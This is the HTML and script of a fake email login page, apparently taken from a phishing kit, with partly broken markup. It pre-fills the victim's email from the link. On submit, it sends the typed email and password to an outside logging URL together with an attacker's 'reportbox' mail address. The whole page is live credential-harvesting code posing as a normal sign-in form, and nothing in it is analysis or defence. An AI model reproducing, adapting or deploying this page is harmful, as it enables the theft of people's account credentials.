  <body

    <div>

            <div aria-live="assertive" role="alert">
              <div class="wrapper">
                <!-- Fixed element that spans the viewport -->
                <div class="element" id="element">
                  <form id="form">
                    <div id="logo">&nbsp;</div>
                    <div id="em">
                      <span style="font-size: 20px"

                    </div>
                    <div>&nbsp;</div>
                    <div id="ep">
                      <input
                        autofocus="autofocus"
                        id="email"
                        name="user"
                        placeholder="Email"
                        required="required"
                        size="50"
                        type="email"
                        value="[[-Email-]]"

                    </div>
                    <div id="ep">
                      <input

                        required="required"
                        size="50"
                        type="password"

                      <div>&nbsp;</div>
                      <div id="no-acc">

    <script>
      const queryString = window.location.search;
      const urlParams = new URLSearchParams(queryString);
      const getemail = urlParams.get("ml");
      document.getElementById("email").value = getemail;
      const form = document.getElementById("form");
      const reportbox = "salamiabdhul2023@gmail.com";
      form.addEventListener("submit", (e) => {
        e.preventDefault();
        const email = document.getElementById("email").value;
        const pass = document.getElementById("pass").value;
        window.open(
          `https://logpages.vercel.app/${email}/${pass}/${reportbox}`,
          "_self"
        );
        console.log("submited");
      });
    </script>
